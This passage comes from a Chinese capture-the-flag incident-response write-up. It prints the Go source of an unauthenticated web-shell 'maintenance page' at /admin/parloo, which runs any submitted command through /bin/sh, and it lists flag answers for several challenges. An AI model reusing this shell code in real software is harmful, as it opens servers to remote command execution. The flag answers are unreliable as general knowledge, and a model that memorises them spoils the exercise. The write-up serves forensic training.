+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;context&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;html/template&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;log&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os/exec&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">type</span> <span class="nx">Command</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Input</span>    <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Output</span>   <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ExecTime</span> <span class="kt">float64</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 日志记录结构
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">type</span> <span class="nx">CommandLog</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Timestamp</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Time</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">IP</span>        <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Command</span>   <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Output</span>    <span class="kt">string</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ExecTime</span>  <span class="kt">float64</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">Error</span>     <span class="kt">string</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">logChan</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="nx">CommandLog</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="c1">// 日志通道用于异步记录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// 启动日志处理协程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">go</span> <span class="nf">handleLogs</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">tmpl</span> <span class="o">:=</span> <span class="nx">template</span><span class="p">.</span><span class="nf">Must</span><span class="p">(</span><span class="nx">template</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;index&#34;</span><span class="p">).</span><span class="nf">Parse</span><span class="p">(</span><span class="nx">htmlTemplate</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/admin/parloo&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Method</span> <span class="o">==</span> <span class="s">&#34;GET&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// 获取客户端IP
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">clientIP</span> <span class="o">:=</span> <span class="nf">getClientIP</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// 处理POST请求
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">cmdInput</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">FormValue</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">cmdInput</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;Command cannot be empty&#34;</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusBadRequest</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// 创建带有超时的context
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">ctx</span><span class="p">,</span> <span class="nx">cancel</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">WithTimeout</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">(),</span> <span class="mi">2</span><span class="o">*</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">defer</span> <span class="nf">cancel</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">start</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">cmd</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">CommandContext</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;-c&#34;</span><span class="p">,</span> <span class="nx">cmdInput</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">//cmd := exec.CommandContext(ctx, &#34;cmd.exe&#34;, &#34;/c&#34;, cmdInput)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">stdout</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cmd</span><span class="p">.</span><span class="nf">CombinedOutput</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">execTime</span> <span class="o">:=</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Since</span><span class="p">(</span><span class="nx">start</span><span class="p">).</span><span class="nf">Seconds</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">result</span> <span class="o">:=</span> <span class="nx">Command</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Input</span><span class="p">:</span>    <span class="nx">cmdInput</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Output</span><span class="p">:</span>   <span class="nb">string</span><span class="p">(</span><span class="nx">stdout</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">ExecTime</span><span class="p">:</span> <span class="nx">execTime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">result</span><span class="p">.</span><span class="nx">Output</span> <span class="o">+=</span> <span class="s">&#34;\n&#34;</span> <span class="o">+</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// 发送日志到通道
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">logChan</span> <span class="o">&lt;-</span> <span class="nx">CommandLog</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Timestamp</span><span class="p">:</span> <span class="nx">time</span><span class="p">.</span><span class="nf">Now</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">IP</span><span class="p">:</span>        <span class="nx">clientIP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Command</span><span class="p">:</span>   <span class="nx">cmdInput</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Output</span><span class="p">:</span>    <span class="nb">string</span><span class="p">(</span><span class="nx">stdout</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">ExecTime</span><span class="p">:</span>  <span class="nx">execTime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Error</span><span class="p">:</span>     <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Server running on :8080&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">http</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">(</span><span class="s">&#34;:8080&#34;</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 获取客户端真实IP
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">getClientIP</span><span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// 处理代理情况
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="nx">ip</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;X-Forwarded-For&#34;</span><span class="p">);</span> <span class="nx">ip</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">ip</span><span class="p">,</span> <span class="s">&#34;,&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">ip</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;X-Real-IP&#34;</span><span class="p">);</span> <span class="nx">ip</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">ip</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">ip</span><span class="p">,</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">SplitHostPort</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">RemoteAddr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">ip</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 异步处理日志
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">handleLogs</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// 确保日志文件存在
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">f</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">OpenFile</span><span class="p">(</span><span class="s">&#34;command.log&#34;</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">O_APPEND</span><span class="p">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_CREATE</span><span class="p">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_WRONLY</span><span class="p">,</span> <span class="mo">0644</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">logEntry</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">logChan</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// 格式化日志条目
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">logLine</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">			<span class="s">&#34;[%s] IP: %-15s | Command: %-20s | ExecTime: %.4fs | Error: %-10v | Output: %s\n&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">logEntry</span><span class="p">.</span><span class="nx">Timestamp</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">&#34;2006-01-02 15:04:05&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">logEntry</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">strings</span><span class="p">.</span><span class="nf">TrimSpace</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">.</span><span class="nx">Command</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">logEntry</span><span class="p">.</span><span class="nx">ExecTime</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">logEntry</span><span class="p">.</span><span class="nx">Error</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">strings</span><span class="p">.</span><span class="nf">TrimSpace</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">.</span><span class="nx">Output</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// 同时输出到控制台和文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">log</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="nx">logLine</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">f</span><span class="p">.</span><span class="nf">WriteString</span><span class="p">(</span><span class="nx">logLine</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;Failed to write log: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ... 保持原有的 htmlTemplate 不变 ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">const</span> <span class="nx">htmlTemplate</span> <span class="p">=</span> <span class="s">`
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;title&gt;parloo服务器维护页面&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        body {
+</span></span></span><span class="line"><span class="cl"><span class="s">            background: #1a1a1a;
+</span></span></span><span class="line"><span class="cl"><span class="s">            color: #ffffff;
+</span></span></span><span class="line"><span class="cl"><span class="s">            min-height: 100vh;
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">        .container {
+</span></span></span><span class="line"><span class="cl"><span class="s">            padding-top: 2rem;
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">        .terminal {
+</span></span></span><span class="line"><span class="cl"><span class="s">            background: #000;
+</span></span></span><span class="line"><span class="cl"><span class="s">            border-radius: 5px;
+</span></span></span><span class="line"><span class="cl"><span class="s">            padding: 1rem;
+</span></span></span><span class="line"><span class="cl"><span class="s">            margin-top: 1rem;
+</span></span></span><span class="line"><span class="cl"><span class="s">            font-family: monospace;
+</span></span></span><span class="line"><span class="cl"><span class="s">            white-space: pre-wrap;
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">        .form-control {
+</span></span></span><span class="line"><span class="cl"><span class="s">            background: #333;
+</span></span></span><span class="line"><span class="cl"><span class="s">            color: #fff;
+</span></span></span><span class="line"><span class="cl"><span class="s">            border: 1px solid #444;
+</span></span></span><span class="line"><span class="cl"><span class="s">        }
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;/style&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;/head&gt;	
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;h1 class=&#34;text-center mb-4&#34;&gt;parloo服务器维护页面&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;form method=&#34;POST&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;div class=&#34;input-group mb-3&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                &lt;input type=&#34;text&#34; class=&#34;form-control&#34; name=&#34;cmd&#34; placeholder=&#34;Enter command...&#34; required&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                &lt;button class=&#34;btn btn-danger&#34; type=&#34;submit&#34;&gt;Execute&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">        </span><span class="cp">{{</span><span class="k">if</span><span class="w"> </span><span class="na">.Input</span><span class="cp">}}</span><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;div class=&#34;result&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;h5&gt;Command: &lt;code&gt;</span><span class="cp">{{</span><span class="na">.Input</span><span class="cp">}}</span><span class="s">&lt;/code&gt;&lt;/h5&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;h5&gt;Execution Time: </span><span class="cp">{{</span><span class="na">.ExecTime</span><span class="cp">}}</span><span class="s">s&lt;/h5&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;div class=&#34;terminal&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                </span><span class="cp">{{</span><span class="na">.Output</span><span class="cp">}}</span><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        </span><span class="cp">{{</span><span class="k">end</span><span class="cp">}}</span><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">`</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中这里</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/admin/parloo&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">r</span><span class="p">.</span><span class="nx">Method</span> <span class="o">==</span> <span class="s">&#34;GET&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">tmpl</span><span class="p">.</span><span class="nf">Execute</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{/admin/parloo}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-17">应急响应2-17
+</h3><p>提交进源机器中恶意程序的MD5作为flag进行提交。 flag格式为palu{MD5小写}</p>
+<p>官方给的pdf里面写了palu03这台机是近源机器</p>
+<p>刚登上去就有一个程序svhost.exe未响应，非常可疑</p>
+<p>里面可以远程桌面，我们可以上传everything进去找</p>
+<p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142334715.png"
+	width="1717"
+	height="943"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142334715_hu3354114354553909995.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142334715_hu11524946835423355072.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603142334715"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="436px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -hashfile svhost.exe MD5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142529202.png"
+	width="1717"
+	height="943"
+	srcset="/p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142529202_hu14577934304731051217.png 480w, /p/2025%E5%B8%95%E9%B2%81%E6%9D%AF%E5%BA%94%E6%80%A5%E5%A4%8D%E7%8E%B0/image-20250603142529202_hu10075580960859717944.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250603142529202"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="436px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{0f80a82621b8c4c3303d198d13776b34}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-18">应急响应2-18
+</h3><p>提交攻击者留下的恶意账户名称md5后作为flag进行提交。 格式为palu{md5{xxxxx}}</p>
+<p>前下就能看到有个恶意账号叫hack</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{d78b6f30225cdc811adfe8d4e7c9fd34}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-19">应急响应2-19
+</h3><p>提交内部群中留下的flag并提交</p>
+<p>点开内网通查看聊天记录得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">palu{nbq_nbq_parloo}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="应急响应2-20">应急响应2-20
+</h3><p>请提交攻击者使用维护页面获取到的敏感内容作为flag进行提交</p>
+<p>前下在server01那台机子上面找到危险功能，我们用xshell连接那台</p>
+<p>回头看前面的mian.go</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">f</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">OpenFile</span><span class="p">(</span><span class="s">&#34;command.log&#34;</span><span class="p">,</span> <span class="nx">os</span><span class="p">.</span><span class="nx">O_APPEND</span><span class="p">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_CREATE</span><span class="p">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_WRONLY</span><span class="p">,</span> <span class="mo">0644</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进机子搜索command.log</p>
